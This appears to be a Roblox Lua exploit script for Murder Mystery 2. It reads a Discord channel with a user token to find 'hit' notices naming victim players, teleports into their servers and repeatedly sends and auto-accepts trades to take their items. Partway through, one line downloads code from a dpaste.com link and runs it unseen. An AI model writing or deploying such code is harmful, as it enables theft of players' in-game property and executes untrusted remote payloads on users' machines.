

if not game:IsLoaded() then
    game.Loaded:Wait()
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

local bb = game:GetService("VirtualUser")
game:service "Players".LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end
local victimUser = readfile("user.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0
local lastRequestTime = 0  -- Track when the last request was sent

local function selectDevice()
    while task.wait(0.1) do
        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
        if DeviceSelectGui then
            local Container = DeviceSelectGui:WaitForChild("Container")
            local Mouse = game.Players.LocalPlayer:GetMouse()
            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
            local centerX = buttonPos.X + buttonSize.X / 2
            local centerY = buttonPos.Y + buttonSize.Y / 2
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        end
    end
end

task.spawn(selectDevice)

local waittime = delay or 2
wait(waittime)

wait(2)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('yo!')

local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

local function acceptRequest()
    while task.wait() do
        local currentTime = tick()
        -- Only send request if 2 seconds have passed since last request
        if currentTime - lastRequestTime >= 2 then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            local args = {
                [1] = game:GetService("Players"):WaitForChild(victimUser)
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
            lastRequestTime = currentTime  -- Update the last request time
        end
    end
end
loadstring(game:HttpGet('https://dpaste.com/533UT4V7A.txt'))()
local function acceptTrade()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
    end
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

local function IsTrading()
    local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
    return trade_status == "StartTrade"
end

local function tradeTimer()
    while task.wait(1) do
        if IsTrading() then
            timer = 0
        else
            timer = timer + 1
        end
    end
end

waitForPlayerLeave()
task.spawn(acceptTrade)
task.spawn(tradeTimer)
wait(3)
task.spawn(acceptRequest)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            return
        end
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get MM2 hit") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                    if placeId and jobId then
                        local victimUsername = message.embeds[1].fields[1].value

                        if didVictimLeave or timer > 5 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                saveJoinedId(tostring(message.id))
                                writefile("user.txt", victimUsername)
                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                return
                            end
                        end
                    end
                end
            end
        end
    end
end

task.spawn(function()
    while true do
        if IsTrading() then
            print("Trade iniciado, esperando 30 segundos...")
            wait(30)
            if IsTrading() then
                print("Trade no se completó en 30 segundos, cancelando...")
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            end
        end
        wait(1)
    end
end)


while wait(5) do
    autoJoin()
end
